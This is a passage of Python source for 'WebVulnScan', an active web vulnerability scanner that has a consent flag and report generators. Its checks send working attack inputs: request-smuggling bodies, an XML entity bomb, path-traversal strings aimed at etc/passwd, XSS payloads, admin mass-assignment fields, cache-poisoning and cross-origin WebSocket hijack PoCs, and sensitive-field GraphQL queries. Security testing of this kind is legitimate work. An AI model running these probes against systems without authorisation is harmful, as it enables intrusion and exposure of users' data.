        f"/backup.zip", f"/db.sql.gz", f"/dump.sql",
    ]
    for path in archives:
        url = target.rstrip("/") + path
        try:
            r = session.head(url, timeout=3, verify=cfg.verify_ssl)
            if r and r.status_code == 200:
                print_vuln("backup_archives", cfg, detail=f"Archive found: {path}", url=url,
                           poc=f"curl -k '{url}'")
                vadd(findings, "backup_archives", f"Found: {path}", url)
        except (requests.RequestException, Exception) as e:
            dbg(f"Backup archive check error: {e}", cfg)
    pr(f"  {G}✔ No backup archives found.{RST}", cfg)


def check_http_smuggling(target, session, findings, cfg):
    section("[42] HTTP/1.1 Request Smuggling (CL.TE)", cfg)
    try:
        headers = {
            "Content-Length": "6",
            "Transfer-Encoding": "chunked",
        }
        body = "0\r\n\r\nX"
        r = session.post(target, headers=headers, data=body,
                         timeout=cfg.timeout, verify=cfg.verify_ssl)
        if r and r.status_code not in (400, 501):
            print_vuln("http_smuggling", cfg,
                       detail="Server accepted conflicting CL+TE headers", url=target)
            vadd(findings, "http_smuggling", "Dual header CL.TE accepted", target)
        else:
            pr(f"  {G}✔ CL.TE conflict rejected.{RST}", cfg)
    except (requests.RequestException, Exception) as e:
        dbg(f"HTTP smuggling check error: {e}", cfg)
        pr(f"  {G}✔ HTTP smuggling check inconclusive.{RST}", cfg)


def check_xml_entity_expansion(target, session, findings, cfg):
    section("[43] XML Bomb (Billion Laughs)", cfg)
    xml_bomb = (
        '<?xml version="1.0"?>'
        '<!DOCTYPE bomb [<!ENTITY a "lol">'
        '<!ENTITY b "&a;&a;&a;&a;&a;">]>'
        '<root>&b;</root>'
    )
    try:
        start = time.time()
        r = session.post(target, data=xml_bomb,
                         headers={"Content-Type": "application/xml"},
                         timeout=3, verify=cfg.verify_ssl)
        elapsed = time.time() - start
        if elapsed >= 2.5:
            print_vuln("xml_bomb", cfg, detail=f"Response took {elapsed:.1f}s with DTD bomb", url=target)
            vadd(findings, "xml_bomb", f"Delay: {elapsed:.1f}s", target)
        else:
            pr(f"  {G}✔ XML bomb did not cause significant delay.{RST}", cfg)
    except requests.exceptions.Timeout:
        print_vuln("xml_bomb", cfg, detail="Request timed out with XML bomb payload", url=target)
        vadd(findings, "xml_bomb", "Timeout on XML bomb", target)
    except (requests.RequestException, Exception) as e:
        dbg(f"XML bomb check error: {e}", cfg)


def check_subdomain_enumeration(target, findings, cfg):
    section("[44] Subdomain Takeover Risk", cfg)
    hostname = urllib.parse.urlparse(target).netloc.split(":")[0]
    # Only flag if DNS explicitly fails (NXDOMAIN) — resolution success is NOT a vuln
    try:
        socket.getaddrinfo(hostname, None)
        pr(f"  {G}✔ DNS resolves normally for {hostname}.{RST}", cfg)
    except socket.gaierror as e:
        if "Name or service not known" in str(e) or "NXDOMAIN" in str(e):
            print_vuln("subdomain_takeover", cfg,
                       detail=f"{hostname} does not resolve (NXDOMAIN) — dangling DNS possible",
                       url=target)
            vadd(findings, "subdomain_takeover", f"NXDOMAIN: {hostname}", target)
        else:
            pr(f"  {Y}ℹ DNS check inconclusive for {hostname}: {e}{RST}", cfg)


def check_path_normalization_bypass(target, session, params, findings, cfg):
    section("[45] Path Normalization Bypass", cfg)
    bypasses = ["..\\..\\", "..;/", "....//", "%252e%252e/", "%2e%2e/"]
    for p in (params or ["path"])[:2]:
        for bypass in bypasses:
            try:
                url = f"{target}?{p}={urllib.parse.quote(bypass)}etc%2fpasswd"
                r = session.get(url, timeout=cfg.timeout, verify=cfg.verify_ssl)
                if r and "root:" in r.text:
                    poc = f"curl -k '{url}'"
                    print_vuln("path_normalization", cfg, detail=f"Bypass: {bypass}", url=url, poc=poc)
                    vadd(findings, "path_normalization", f"Bypass: {bypass}", url, poc=poc)
                    return
            except (requests.RequestException, Exception) as e:
                dbg(f"Path norm check error: {e}", cfg)
    pr(f"  {G}✔ No path normalization bypass detected.{RST}", cfg)


def check_mass_assignment(target, session, findings, cfg):
    section("[46] Mass Assignment", cfg)
    payloads = [
        {"user[role]": "admin", "user[is_admin]": "1"},
        {"role": "admin", "is_admin": "true", "admin": "1"},
    ]
    for data in payloads:
        try:
            r = session.post(target, data=data, timeout=cfg.timeout, verify=cfg.verify_ssl)
            if r and r.status_code == 200:
                body = r.text.lower()
                if '"admin"' in body or '"role"' in body or "is_admin" in body:
                    print_vuln("mass_assignment", cfg,
                               detail="Admin role fields accepted in request body",
                               url=target,
                               poc=f"curl -X POST '{target}' -d 'role=admin&is_admin=1'")
                    vadd(findings, "mass_assignment", "Admin fields accepted", target)
                    return
        except (requests.RequestException, Exception) as e:
            dbg(f"Mass assignment check error: {e}", cfg)
    pr(f"  {G}✔ No mass assignment detected.{RST}", cfg)


def check_oauth_config_exposure(target, session, findings, cfg):
    section("[47] OAuth / OIDC Configuration Exposure", cfg)
    oauth_paths = [
        "/.well-known/openid-configuration",
        "/.well-known/oauth-authorization-server",
        "/oauth/authorize",
        "/auth/.well-known/openid-configuration",
    ]
    for path in oauth_paths:
        url = target.rstrip("/") + path
        try:
            r = session.get(url, timeout=5, verify=cfg.verify_ssl)
            if r and r.status_code == 200 and "issuer" in r.text:
                print_vuln("oauth_misconfiguration", cfg,
                           detail="OAuth/OIDC config exposed", url=url,
                           poc=f"curl -k '{url}'")
                vadd(findings, "oauth_misconfiguration", "Config exposed", url)
                return
        except (requests.RequestException, Exception) as e:
            dbg(f"OAuth check error: {e}", cfg)
    pr(f"  {G}✔ No OAuth config exposure found.{RST}", cfg)


def check_account_enumeration_patterns(target, session, findings, cfg):
    section("[48] Account Enumeration", cfg)
    usernames = ["admin", "nonexistent_zz99", "test"]
    response_sizes: Dict[str, int] = {}
    for user in usernames:
        try:
            r = session.get(f"{target}?user={user}", timeout=cfg.timeout, verify=cfg.verify_ssl)
            if r:
                response_sizes[user] = len(r.content)
        except (requests.RequestException, Exception) as e:
            dbg(f"Account enumeration check error: {e}", cfg)
    sizes = list(response_sizes.values())
    if len(set(sizes)) > 1 and max(sizes) - min(sizes) > 50:
        print_vuln("account_enumeration", cfg,
                   detail="Different response sizes for valid/invalid usernames",
                   url=target)
        vadd(findings, "account_enumeration", "Response size differs per username", target)
    else:
        pr(f"  {G}✔ No obvious account enumeration.{RST}", cfg)


# ══════════════════════════════════════════════════════════════════════════
# NEW: ADVANCED WEB ATTACKS
# ══════════════════════════════════════════════════════════════════════════

def check_web_cache_poisoning(target, session, findings, cfg):
    """
    Web Cache Poisoning & Deception:
    Sends unkeyed headers and checks if the value is reflected in the response,
    which indicates the header influences the response but is likely not part of the
    cache key — a prerequisite for cache poisoning.
    """
    section("[ADV-1] Web Cache Poisoning", cfg)
    found = []
    # Baseline response
    baseline = req(session, target, cfg)
    if not baseline:
        pr(f"  {Y}ℹ Could not fetch baseline.{RST}", cfg)
        return

    for hdrs in CACHE_POISON_HEADERS:
        header_name = list(hdrs.keys())[0]
        canary = list(hdrs.values())[0]
        try:
            r = session.get(target, headers=hdrs, timeout=cfg.timeout, verify=cfg.verify_ssl)
            if r:
                reflected_in_body = canary in r.text
                reflected_in_location = canary in r.headers.get("location", "")
                reflected_in_host = canary in r.headers.get("host", "")
                if reflected_in_body or reflected_in_location or reflected_in_host:
                    found.append((header_name, canary))
        except (requests.RequestException, Exception) as e:
            dbg(f"Cache poisoning check error ({header_name}): {e}", cfg)

    if found:
        for hdr, canary in found:
            poc = (f"# Step 1: Poison the cache\n"
                   f"curl -H '{hdr}: {canary}' '{target}'\n"
                   f"# Step 2: Fetch without header — victim receives poisoned response\n"
                   f"curl '{target}'")
            print_vuln("web_cache_poisoning", cfg,
                       detail=f"Header '{hdr}' reflected in response", url=target, poc=poc)
            vadd(findings, "web_cache_poisoning", f"Header {hdr} reflected", target, poc=poc)
    else:
        pr(f"  {G}✔ No cache poisoning indicators found.{RST}", cfg)


def check_dom_xss(target, session, findings, cfg):
    """
    DOM-Based XSS:
    1. If --dom-xss is set and Playwright is installed, launches a headless
       browser, injects a canary payload, and checks if it executes in a DOM sink.
    2. Otherwise performs heuristic static analysis of the page source looking
       for dangerous DOM sinks that accept URL-controlled inputs.
    """
    section("[ADV-2] DOM-Based XSS", cfg)

    if cfg.dom_xss:
        try:
            from playwright.sync_api import sync_playwright, TimeoutError as PWTimeout

            CANARY = "window.__DOM_XSS__=1"
            dom_payloads = [
                f"#{CANARY}",
                f"?q=<img src=x onerror={CANARY}>",
                f"?q=javascript:{CANARY}",
                f"#<script>{CANARY}</script>",
            ]

            with sync_playwright() as pw:
                browser = pw.chromium.launch(headless=True)
                page = browser.new_page()
                try:
                    for payload in dom_payloads:
                        test_url = target + payload
                        try:
                            page.goto(test_url, timeout=10_000, wait_until="networkidle")
                            fired = page.evaluate("() => window.__DOM_XSS__ === 1")
                            if fired:
                                poc = f"# Visit in browser: {test_url}"
                                print_vuln("dom_xss", cfg,
                                           detail=f"Payload executed in DOM sink",
                                           url=test_url, poc=poc)
                                vadd(findings, "dom_xss", "Canary executed", test_url, poc=poc)
                                return
                        except PWTimeout:
                            dbg(f"Playwright timeout on {test_url}", cfg)
                        except Exception as e:
                            dbg(f"Playwright page error: {e}", cfg)
                finally:
                    browser.close()
            pr(f"  {G}✔ DOM XSS canary did not fire.{RST}", cfg)
            return

        except ImportError:
            pr(f"  {Y}ℹ Playwright not installed — falling back to static heuristic analysis.{RST}", cfg)
            pr(f"  {Y}  Install: pip install playwright && playwright install chromium{RST}", cfg)

    # ── Heuristic fallback: static analysis ──
    r = req(session, target, cfg)
    if not r:
        pr(f"  {Y}ℹ Could not fetch page for static DOM analysis.{RST}", cfg)
        return

    found_sinks = [pat for pat in DOM_SINK_PATTERNS if re.search(pat, r.text)]
    if found_sinks:
        detail = f"Dangerous DOM sinks in source: {', '.join(found_sinks[:4])}"
        poc = ("# Manual verification required. Try injecting payloads via:\n"
               f"# URL hash: {target}#<img src=x onerror=alert(1)>\n"
               f"# Query param: {target}?q=<img src=x onerror=alert(1)>")
        print_vuln("dom_xss", cfg, detail=detail, url=target, poc=poc)
        vadd(findings, "dom_xss", detail, target, poc=poc)
    else:
        pr(f"  {G}✔ No obvious DOM XSS sinks detected (static analysis only).{RST}", cfg)


def check_http2_attacks(target, session, findings, cfg):
    """
    HTTP/2 Attack Vectors:
    - CVE-2023-44487 Rapid Reset: checks if server exposes HTTP/2 and whether
      the server header matches known unpatched versions.
    - HTTP/2 → HTTP/1.1 downgrade smuggling: sends TE/CL headers that are
      illegal in HTTP/2 and checks if the server accepts them.

    Requires `httpx[http2]` (pip install 'httpx[http2]').
    """
    section("[ADV-3] HTTP/2 Attacks (Rapid Reset + Downgrade Smuggling)", cfg)
    try:
        import httpx

        with httpx.Client(http2=True, verify=cfg.verify_ssl, timeout=cfg.timeout) as client:
            try:
                resp = client.get(target)
            except Exception as e:
                pr(f"  {Y}ℹ HTTP/2 connect error: {e}{RST}", cfg)
                return

            if resp.http_version != "HTTP/2":
                pr(f"  {G}✔ HTTP/2 not used ({resp.http_version}).{RST}", cfg)
                return

            pr(f"  {Y}⚠ HTTP/2 supported. Checking CVE-2023-44487…{RST}", cfg)
            server = resp.headers.get("server", "")

            # Known-vulnerable version patterns for CVE-2023-44487 (Rapid Reset)
            # (This is a heuristic; actual exploitation requires raw frame manipulation.)
            rapid_reset_vuln = [
                "nginx/1.25.2", "nginx/1.25.1", "nginx/1.25.0",
                "h2o/", "envoy/1.27", "golang/", "grpc/",
            ]
            if any(v in server.lower() for v in rapid_reset_vuln):
                print_vuln("http2_rapid_reset", cfg,
                           detail=f"HTTP/2 server may be vulnerable to CVE-2023-44487 (server: {server})",
                           url=target,
                           poc=("# Verify with: https://github.com/secengjeff/rapidresetclient\n"
                                f"# Server: {server}"))
                vadd(findings, "http2_rapid_reset",
                     f"HTTP/2 + potentially vulnerable server: {server}", target)
            else:
                pr(f"  {G}✔ Server not in known-unpatched list ({server or 'header not set'}).{RST}", cfg)

            # HTTP/2 downgrade smuggling: TE + CL headers are forbidden in h2
            # A backend that re-encodes to HTTP/1.1 might smuggle if it forwards them.
            try:
                r2 = client.post(target,
                                 headers={"transfer-encoding": "chunked",
                                          "content-length": "0"},
                                 content=b"")
                if r2.status_code not in (400, 422, 501):
                    print_vuln("http2_downgrade_smuggling", cfg,
                               detail="HTTP/2 server accepted forbidden TE+CL headers",
                               url=target,
                               poc=f"# Use Burp Suite HTTP/2 tab to verify downgrade smuggling at {target}")
                    vadd(findings, "http2_downgrade_smuggling",
                         "TE+CL headers not rejected in h2", target)
                else:
                    pr(f"  {G}✔ HTTP/2 server correctly rejected TE+CL headers.{RST}", cfg)
            except Exception as e:
                dbg(f"HTTP/2 downgrade check error: {e}", cfg)

    except ImportError:
        pr(f"  {Y}ℹ httpx[http2] not installed — skipping. Install: pip install 'httpx[http2]'{RST}", cfg)
    except Exception as e:
        dbg(f"HTTP/2 check error: {e}", cfg)
        pr(f"  {Y}ℹ HTTP/2 check inconclusive.{RST}", cfg)


def check_websocket_security(target, session, findings, cfg):
    """
    WebSocket Security:
    - Discovers WS endpoints from page source and common paths.
    - Tests for Cross-Site WebSocket Hijacking (CSWSH) by connecting without
      auth cookies and with a cross-origin Origin header.
    - Checks for unauthenticated data leaks by reading messages.

    Requires `websockets` (pip install websockets).
    """
    section("[ADV-4] WebSocket Security (CSWSH + Unauth Data Leak)", cfg)

    # Discover ws:// / wss:// endpoints from the page
    r = req(session, target, cfg)
    ws_urls_found: List[str] = []
    if r:
        for match in re.finditer(r'(wss?://[^\s"\'<>]+)', r.text):
            ws_urls_found.append(match.group(1).rstrip("/"))

    # Construct common WS candidates from the base URL
    base_ws = target.replace("https://", "wss://").replace("http://", "ws://")
    candidates = list(set(ws_urls_found + [base_ws + p for p in WS_COMMON_PATHS]))

    if not candidates:
        pr(f"  {G}✔ No WebSocket endpoints discovered.{RST}", cfg)
        return

    try:
        import websockets
        import websockets.exceptions

        async def probe_ws(ws_url: str):
            """
            Try to connect with:
            1. No cookies (unauthenticated)
            2. A spoofed Origin (CSWSH simulation)
            """
            results = []
            cross_origin = "https://attacker.com"
            try:
                extra_headers = {"Origin": cross_origin}
                ssl_ctx = True if ws_url.startswith("wss://") else None

                async with websockets.connect(
                    ws_url,
                    ssl=ssl_ctx,
                    additional_headers=extra_headers,
                    open_timeout=5,
                    close_timeout=3,
                ) as ws:
                    results.append(("unauthenticated_ws", ws_url))
                    # Try to receive initial data
                    try:
                        msg = await asyncio.wait_for(ws.recv(), timeout=3)
                        if msg:
                            results.append(("ws_data_leak", ws_url, str(msg)[:200]))
                    except (asyncio.TimeoutError, websockets.exceptions.ConnectionClosed):
                        pass
            except (OSError, websockets.exceptions.InvalidStatusCode,
                    websockets.exceptions.WebSocketException, Exception) as e:
                dbg(f"WS probe error {ws_url}: {e}", cfg)
            return results

        async def run_all():
            for ws_url in candidates[:5]:
                res = await probe_ws(ws_url)
                for item in res:
                    if item[0] == "unauthenticated_ws":
                        poc = (f"python3 -c \"\n"
                               f"import asyncio, websockets\n"
                               f"async def t():\n"
                               f"    async with websockets.connect('{item[1]}', "
                               f"additional_headers={{'Origin':'https://attacker.com'}}) as ws:\n"
                               f"        print(await ws.recv())\n"
                               f"asyncio.run(t())\n\"")
                        print_vuln("websocket_no_auth", cfg,
                                   detail=f"Connected with cross-origin Origin header",
                                   url=item[1], poc=poc)
                        vadd(findings, "websocket_no_auth", "CSWSH: connected without auth", item[1], poc=poc)

                    elif item[0] == "ws_data_leak":
                        snippet = item[2][:80]
                        print_vuln("websocket_data_leak", cfg,
                                   detail=f"Unauthenticated data received: {snippet}…",
                                   url=item[1])
                        vadd(findings, "websocket_data_leak",
                             f"Data without auth: {snippet}", item[1])

        asyncio.run(run_all())

    except ImportError:
        pr(f"  {Y}ℹ websockets not installed — skipping. Install: pip install websockets{RST}", cfg)
    except Exception as e:
        dbg(f"WebSocket check error: {e}", cfg)
        pr(f"  {Y}ℹ WebSocket check inconclusive.{RST}", cfg)


# ══════════════════════════════════════════════════════════════════════════
# NEW: API & MICROSERVICES — BROKEN PROPERTY LEVEL AUTHORIZATION (BPLA)
# ══════════════════════════════════════════════════════════════════════════

def check_bpla(target, session, findings, cfg):
    """
    Broken Property-Level Authorization (BPLA):
    - GraphQL: Uses introspection to enumerate fields, then queries for
      sensitive/hidden fields that should not be returned.
    - REST: Requests common API endpoints and inspects JSON responses for
      sensitive field names that indicate over-exposure.
    """
    section("[ADV-5] Broken Property-Level Authorization (BPLA)", cfg)

    SENSITIVE_FIELDS = [
        "password", "passwordHash", "password_hash", "secret",
        "privateKey", "private_key", "apiKey", "api_key",
        "accessToken", "access_token", "refreshToken", "refresh_token",
        "ssn", "socialSecurityNumber", "creditCard", "credit_card",
        "cvv", "pin", "dob", "dateOfBirth",
    ]

    # ── GraphQL BPLA ──
    gql_endpoints = [target.rstrip("/") + ep
                     for ep in ["/graphql", "/api/graphql", "/query", "/graphql/v1"]]
    graphql_found = False

    for gql_url in gql_endpoints:
        try:
            # Step 1: Check introspection for queryable types
            r_intro = session.post(
                gql_url,
                json={"query": '{__schema{queryType{fields{name type{name}}}}}'},
                timeout=5, verify=cfg.verify_ssl,
            )
            if not (r_intro and r_intro.status_code == 200 and "data" in r_intro.text):
                continue

            pr(f"  {Y}⚠ GraphQL endpoint found: {gql_url}{RST}", cfg)

            # Step 2: Try querying sensitive fields directly
            for field in SENSITIVE_FIELDS[:6]:
                test_query = {"query": f"{{ user {{ {field} }} }}"}
                try:
                    r_q = session.post(gql_url, json=test_query, timeout=5,
                                       verify=cfg.verify_ssl)
                    if r_q and r_q.status_code == 200:
                        try:
                            body = r_q.json()
                            data_block = body.get("data", {})
                            if data_block and field in json.dumps(data_block):
                                errors = body.get("errors", [])
                                if not errors:
                                    poc = (f"curl -X POST '{gql_url}' "
                                           f"-H 'Content-Type: application/json' "
                                           f"-d '{{\"query\":\"{{ user {{ {field} }} }}\"}}'")
                                    print_vuln("bpla_graphql", cfg,
                                               detail=f"Field '{field}' returned in GraphQL response",
                                               url=gql_url, poc=poc)
                                    vadd(findings, "bpla_graphql",
                                         f"Field '{field}' exposed", gql_url, poc=poc)
                                    graphql_found = True
                        except (ValueError, Exception) as e:
                            dbg(f"BPLA GraphQL JSON parse error: {e}", cfg)
                except (requests.RequestException, Exception) as e:
                    dbg(f"BPLA GraphQL field test error: {e}", cfg)
        except (requests.RequestException, Exception) as e:
            dbg(f"BPLA GraphQL introspection error: {e}", cfg)

    if not graphql_found:
        pr(f"  {G}✔ No BPLA issues found in GraphQL.{RST}", cfg)

    # ── REST BPLA ──
    rest_paths = ["/api/users/me", "/api/user", "/api/profile",
                  "/api/account", "/api/me", "/api/v1/user", "/api/v1/me"]
    rest_found = False

    for path in rest_paths:
        url = target.rstrip("/") + path
        try:
            r = session.get(url, timeout=cfg.timeout, verify=cfg.verify_ssl)
            if not (r and r.status_code == 200):
                continue
            ct = r.headers.get("content-type", "")
            if "json" not in ct:
                continue
            try:
                data = r.json()
                dump_lower = json.dumps(data).lower()
                exposed = [f for f in SENSITIVE_FIELDS
                           if f.lower() in dump_lower]
                if exposed:
                    poc = f"curl -k '{url}'"
                    print_vuln("bpla_rest", cfg,
                               detail=f"Sensitive fields in response: {', '.join(exposed[:5])}",
                               url=url, poc=poc)
                    vadd(findings, "bpla_rest",
                         f"Fields: {', '.join(exposed[:5])}", url, poc=poc)
                    rest_found = True
            except (ValueError, Exception) as e:
                dbg(f"BPLA REST JSON parse error: {e}", cfg)
        except (requests.RequestException, Exception) as e:
            dbg(f"BPLA REST check error {url}: {e}", cfg)

    if not rest_found:
        pr(f"  {G}✔ No BPLA issues found in REST endpoints.{RST}", cfg)


# ══════════════════════════════════════════════════════════════════════════
# REPORTING
# ══════════════════════════════════════════════════════════════════════════

def save_json(findings: List[Vulnerability], cfg: ScanConfig, target: str):
    if not cfg.output_json:
        return
    data = {
        "scanner": f"WebVulnScan v{VERSION}",
        "target": target,
        "scan_time": datetime.now(timezone.utc).isoformat(),
        "total": len(findings),
        "findings": [f.to_dict() for f in findings],
    }
    try:
        with open(cfg.output_json, "w") as fh:
            json.dump(data, fh, indent=2)
        pr(f"  {G}✔ JSON report → {cfg.output_json}{RST}", cfg)
    except Exception as e:
        logger.error(f"Failed to write JSON report: {e}")


def save_pocs(findings: List[Vulnerability], cfg: ScanConfig, target: str):
    if not cfg.output_pocs:
        return
    pocs = [f for f in findings if f.poc]
    if not pocs:
        pr(f"  {Y}ℹ No PoC commands to save.{RST}", cfg)
        return
    try:
        with open(cfg.output_pocs, "w") as fh:
            fh.write(f"#!/bin/bash\n# WebVulnScan v{VERSION} — PoCs for {target}\n\n")
            for v in pocs:
                fh.write(f"# ── {v.name} [{v.severity}] ──\n{v.poc}\n\n")
        os.chmod(cfg.output_pocs, 0o755)
        pr(f"  {G}✔ PoC script → {cfg.output_pocs}{RST}", cfg)
    except Exception as e:
        logger.error(f"Failed to write PoC file: {e}")


def save_html(findings: List[Vulnerability], cfg: ScanConfig, target: str):
    if not cfg.output_html:
        return
    counts = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    for f in findings:
        if f.severity in counts:
            counts[f.severity] += 1

    rows = ""
    for f in findings:
        poc_display = f.poc or "Manual verification required."
        rows += f"""
        <div class="finding-row">
            <h3>{f.name}</h3>
            <p><span class="sev-{f.severity}">[{f.severity}]</span>
               &nbsp;CVSS: {f.cvss_score:.1f}&nbsp;|&nbsp;CWE: {f.cwe_id}
               &nbsp;|&nbsp;OWASP: {f.owasp}</p>
            <p><strong>URL:</strong> <span class="url">{f.url}</span></p>
            <p><strong>Detail:</strong> {f.detail}</p>
            <h4>📋 Proof of Concept</h4>
            <div class="poc">{poc_display}</div>
            <h4>✅ Remediation</h4>
            <p>{f.fix}</p>
        </div>
        """

    html = f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>WebVulnScan v{VERSION} — {target}</title>
<style>
  body{{font-family:sans-serif;background:#f4f4f4;color:#333;margin:0;padding:20px}}
  .wrap{{max-width:1200px;margin:auto;background:#fff;padding:30px;box-shadow:0 0 12px rgba(0,0,0,.1)}}
  h1{{color:#2c3e50;border-bottom:3px solid #3498db;padding-bottom:10px}}
  .summary{{display:flex;gap:15px;margin:20px 0}}
  .card{{flex:1;padding:15px;border-radius:6px;color:#fff;font-weight:700;text-align:center;font-size:1.1em}}
  .crit{{background:#e74c3c}}.high{{background:#e67e22}}.med{{background:#f1c40f;color:#333}}.low{{background:#3498db}}
  .finding-row{{background:#fafafa;padding:15px;margin:12px 0;border-left:4px solid #3498db;border-radius:4px}}
  .sev-CRITICAL{{color:#e74c3c;font-weight:700}}
  .sev-HIGH{{color:#e67e22;font-weight:700}}
  .sev-MEDIUM{{color:#f39c12;font-weight:700}}
  .sev-LOW{{color:#3498db;font-weight:700}}
  .poc{{font-family:monospace;background:#2c3e50;color:#2ecc71;padding:12px;border-radius:4px;
        white-space:pre-wrap;word-break:break-all;margin:8px 0}}
  .url{{word-break:break-all;color:#2980b9}}
  h4{{margin:10px 0 4px;color:#2c3e50}}
  footer{{color:#7f8c8d;font-size:.85em;margin-top:30px;border-top:1px solid #ddd;padding-top:10px}}
</style>
</head>
<body>
<div class="wrap">
  <h1>🔒 WebVulnScan v{VERSION} — Security Report</h1>
  <p><strong>Target:</strong> <span class="url">{target}</span><br>
     <strong>Scan time:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}<br>
     <strong>Findings:</strong> {len(findings)}</p>
  <div class="summary">
    <div class="card crit">🔴 {counts['CRITICAL']}<br><small>Critical</small></div>
    <div class="card high">🟠 {counts['HIGH']}<br><small>High</small></div>
    <div class="card med">🟡 {counts['MEDIUM']}<br><small>Medium</small></div>
    <div class="card low">🔵 {counts['LOW']}<br><small>Low</small></div>
  </div>
  <h2>Findings</h2>
  {rows}
  <footer>
    <p>Generated by WebVulnScan v{VERSION} | 
       ⚠ This report is confidential. Handle with care.</p>
  </footer>
</div>
</body>
</html>"""

    try:
        with open(cfg.output_html, "w", encoding="utf-8") as fh:
            fh.write(html)
        pr(f"  {G}✔ HTML report → {cfg.output_html}{RST}", cfg)
    except Exception as e:
        logger.error(f"Failed to write HTML report: {e}")


# ══════════════════════════════════════════════════════════════════════════
# MAIN
# ══════════════════════════════════════════════════════════════════════════

def main():
    ap = argparse.ArgumentParser(
        description=f"WebVulnScan v{VERSION} — Web Vulnerability Scanner",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "⚠  LEGAL: Only scan systems you own or have written permission to test.\n\n"
            "Examples:\n"
            "  %(prog)s https://example.com --authorized\n"
            "  %(prog)s https://example.com --authorized --profile full -o report.json --html report.html\n"
            "  %(prog)s https://example.com --authorized --dom-xss --auth-cookie 'session=abc'\n"
        ),
    )
    ap.add_argument("target", nargs="?", help="Target URL")
    ap.add_argument("--targets", dest="targets_file", help="File containing list of target URLs")
    ap.add_argument("--profile", choices=["quick", "standard", "full", "api"], default="standard")
    ap.add_argument("-t", "--timeout", type=int, default=None)
    ap.add_argument("-w", "--threads", type=int, default=None)
    ap.add_argument("--proxy", help="HTTP proxy URL (e.g. http://127.0.0.1:8080)")
    ap.add_argument("-o", "--output", dest="output_json", help="Save findings to JSON file")
    ap.add_argument("--html", dest="output_html", help="Save HTML report")
    ap.add_argument("--save-pocs", dest="output_pocs", help="Save PoC commands to a bash script")
    ap.add_argument("-v", "--verbose", action="store_true")
    ap.add_argument("-q", "--quiet", action="store_true")
    ap.add_argument("--verify-ssl", dest="verify_ssl", action="store_true",
                    help="Verify TLS certificates (default: on)")
    ap.add_argument("--no-verify", dest="verify_ssl", action="store_false",
                    help="Skip TLS certificate verification")
    ap.set_defaults(verify_ssl=True)
    ap.add_argument("--config", help="Path to INI config file")
    ap.add_argument("--skip", dest="skip_checks", default="",
                    help="Comma-separated list of check names to skip (e.g. sqli,xss)")
    ap.add_argument("--auth-cookie", dest="auth_cookie", default="",
                    help="Session cookie for authenticated scans (e.g. 'session=abc123')")
    ap.add_argument("--auth-header", dest="auth_header", default="",
                    help="Auth header (e.g. 'Authorization: Bearer TOKEN')")
    # Consent gate — required for active scanning
    ap.add_argument("--authorized", action="store_true",
                    help="Confirm you have permission to scan this target (REQUIRED for active checks)")
    ap.add_argument("--dom-xss", dest="dom_xss", action="store_true",
                    help="Enable Playwright-powered DOM XSS testing (requires: pip install playwright)")
    ap.add_argument("--version", action="version", version=f"WebVulnScan {VERSION}")
    args = ap.parse_args()

    # ── Consent gate ──
    if not args.authorized:
        print(f"{R}{BOLD}ERROR: --authorized flag is required.{RST}")
        print(f"{Y}Only scan systems you own or have explicit written permission to test.")
        print(f"Re-run with --authorized to confirm consent.{RST}")
        sys.exit(1)

    # ── Profile defaults ──
    profiles = {
        "quick":    {"threads": 20, "timeout":  5, "pages": 10},
        "standard": {"threads": 15, "timeout": 10, "pages": 30},
        "full":     {"threads": 25, "timeout": 15, "pages": 100},
        "api":      {"threads": 20, "timeout": 10, "pages": 20},
    }
    prof = profiles[args.profile]

    # ── Config file ──
    cfg_file: Dict[str, str] = {}
    if args.config:
        cp = configparser.ConfigParser()
        try:
            cp.read(args.config)
            if "scan" in cp:
                cfg_file = dict(cp["scan"])
                logger.info(f"Loaded config from {args.config}")
        except Exception as e:
            logger.error(f"Config file error: {e}")

    env = os.environ

    def setting(name, default=None):
        val = getattr(args, name, None)
        if val is not None and val != "" and val is not False:
            return val
        val = cfg_file.get(name)
        if val is not None:
            return val
        val = env.get(name.upper())
        if val is not None:
            return val
        return default

    if args.verbose:
        logger.setLevel(logging.DEBUG)
    elif args.quiet:
        logger.setLevel(logging.WARNING)

    # File-based log handler
    logfn = cfg_file.get("log_file")
    if logfn:
        try:
            fh = logging.FileHandler(logfn)
            fh.setFormatter(_formatter)
            logger.addHandler(fh)
        except Exception as e:
            logger.error(f"Cannot open log file {logfn}: {e}")

    skip_set: Set[str] = set()
    skip_raw = setting("skip_checks", "")
    if skip_raw:
        skip_set = {s.strip() for s in skip_raw.split(",") if s.strip()}

    cfg = ScanConfig(
        target=setting("target") or "",
        targets_file=setting("targets_file") or "",
        profile=setting("profile") or args.profile,
        timeout=int(setting("timeout") or prof["timeout"]),
        threads=int(setting("threads") or prof["threads"]),
        max_crawl_pages=int(setting("max_crawl_pages") or prof["pages"]),
        proxy=setting("proxy") or "",
        output_json=setting("output_json") or "",
        output_html=setting("output_html") or "",
        output_pocs=setting("output_pocs") or "",
        verbose=bool(args.verbose),
        quiet=bool(args.quiet),
        verify_ssl=bool(args.verify_ssl),
        skip_checks=skip_set,
        auth_cookie=args.auth_cookie or "",
        auth_header=args.auth_header or "",
        authorized=True,
        dom_xss=bool(args.dom_xss),
    )

    # ── Target list ──
    targets: List[str] = []
    if cfg.targets_file:
        try:
            with open(cfg.targets_file) as fh:
                targets = [normalize(line.strip()) for line in fh if line.strip()]
        except Exception as e:
            logger.error(f"Could not read targets file: {e}")
            sys.exit(1)
    elif cfg.target:
        targets = [normalize(cfg.target)]
    else:
        ap.print_help()
        sys.exit(1)

    print(f"\n{B}{BOLD}WebVulnScan v{VERSION}{RST}")
    print(f"{Y}Legal reminder: only scan systems you are authorized to test.{RST}\n")

    all_findings: List[Vulnerability] = []
    try:
        for target in targets:
            pr(f"\n{G}{'═'*56}{RST}", cfg)
            pr(f"{G}[*] Target: {target}  Profile: {cfg.profile.upper()}{RST}", cfg)
            pr(f"{G}{'═'*56}{RST}", cfg)

            session = get_session(cfg)
            findings: List[Vulnerability] = []

            r = req(session, target, cfg)
            if not r:
                pr(f"{R}Could not connect to {target}{RST}", cfg)
                continue
            if r.status_code >= 400:
                pr(f"{Y}Warning: Initial request returned HTTP {r.status_code}{RST}", cfg)

            # ── Passive checks ──
            check_headers(r, findings, cfg)
            check_cors(r, findings, cfg)
            check_cookies(r, findings, cfg)
